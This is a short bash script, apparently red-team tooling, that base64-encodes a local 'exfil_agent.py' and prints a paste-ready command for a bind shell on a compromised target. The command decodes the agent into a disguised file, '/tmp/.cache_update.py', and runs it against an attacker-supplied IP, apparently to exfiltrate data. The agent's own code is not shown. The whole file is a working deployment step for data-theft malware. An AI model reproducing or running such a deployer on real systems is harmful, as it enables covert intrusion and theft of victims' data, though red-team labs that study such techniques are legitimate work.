#!/bin/bash
# ============================================
# Red Team - Deploy Exfil Agent to Target
# Generates the base64 command to paste into bind shell
# ============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_FILE="${SCRIPT_DIR}/exfil_agent.py"
WSL2_IP="${1:?Usage: ./deploy_agent.sh <WSL2_IP>}"

if [ ! -f "$AGENT_FILE" ]; then
    echo "[X] $AGENT_FILE not found"
    exit 1
fi

B64=$(base64 -w0 "$AGENT_FILE")

echo "[*] Deploy command generated. Paste this into the bind shell:"
echo ""
echo "echo '${B64}' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${WSL2_IP}"
echo ""
echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
echo "[*] Base64 size: ${#B64} chars"
